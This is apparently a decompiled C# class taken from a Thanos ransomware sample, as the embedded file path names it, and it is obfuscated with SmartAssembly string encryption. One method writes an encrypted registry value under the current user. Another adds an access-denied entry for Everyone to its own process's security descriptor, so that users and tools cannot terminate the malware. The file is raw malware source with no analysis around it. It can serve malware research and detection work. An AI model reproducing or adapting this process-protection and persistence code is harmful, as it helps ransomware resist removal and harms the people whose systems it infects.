// Decompiled with JetBrains decompiler
// Type: frgoWklvEOSV.dDyurqCmIYO
// Assembly: chaddad, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6BDE87D8-B0AC-468F-B40C-8A894553F651
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Thanos.gen-66ed5384220ff3091903e14a54849f824fdd13ac70dc4e0127eb59c1de801fc2.exe

using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace frgoWklvEOSV
{
  internal sealed class dDyurqCmIYO
  {
    [NonSerialized]
    internal static GetString \u0016;

    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    private static extern bool JWCMbZawsBteH(
      IntPtr OaApsaiJWBTboDYV,
      int GGYDxIzgOEHe,
      [Out] byte[] pcjIlFgZfJzCxk,
      uint egboQbWvdYUp,
      out uint vtuwIBfmZuHHB);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    private static extern bool DdsTwxAFAwR(
      IntPtr FrcYMHQHnHUlB,
      int tVMHAivbcumDjO,
      [In] byte[] bVUUJPXRQqeQHa);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr LBaWHVltWHfci();

    public void iRhAYdJtRklx([In] bool obj0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(PFruJiQrcriiZ.GwTsezEgVAuVAU(dDyurqCmIYO.\u0016(107403392)));
        subKey.SetValue(PFruJiQrcriiZ.GwTsezEgVAuVAU(dDyurqCmIYO.\u0016(107403255)), (object) dDyurqCmIYO.\u0016(107404405));
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor KJiAghXcDInbeBqcBB([In] IntPtr obj0)
    {
      byte[] pcjIlFgZfJzCxk = new byte[0];
      uint vtuwIBfmZuHHB;
      dDyurqCmIYO.JWCMbZawsBteH(obj0, 4, pcjIlFgZfJzCxk, 0U, out vtuwIBfmZuHHB);
      if (vtuwIBfmZuHHB < 0U || vtuwIBfmZuHHB > (uint) short.MaxValue)
        return (RawSecurityDescriptor) null;
      byte[] binaryForm;
      return !dDyurqCmIYO.JWCMbZawsBteH(obj0, 4, binaryForm = new byte[(IntPtr) vtuwIBfmZuHHB], vtuwIBfmZuHHB, out vtuwIBfmZuHHB) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
    }

    private void mIZccETANlKcj([In] IntPtr obj0, [In] RawSecurityDescriptor obj1)
    {
      byte[] numArray = new byte[obj1.BinaryLength];
      obj1.GetBinaryForm(numArray, 0);
      dDyurqCmIYO.DdsTwxAFAwR(obj0, 4, numArray);
    }

    public void snmtsQVthnGhgVm()
    {
      try
      {
        IntPtr num = dDyurqCmIYO.LBaWHVltWHfci();
        RawSecurityDescriptor securityDescriptor = this.KJiAghXcDInbeBqcBB(num);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.mIZccETANlKcj(num, securityDescriptor);
      }
      catch (Exception ex)
      {
      }
    }

    static dDyurqCmIYO() => Strings.CreateGetStringDelegate(typeof (dDyurqCmIYO));
  }
}
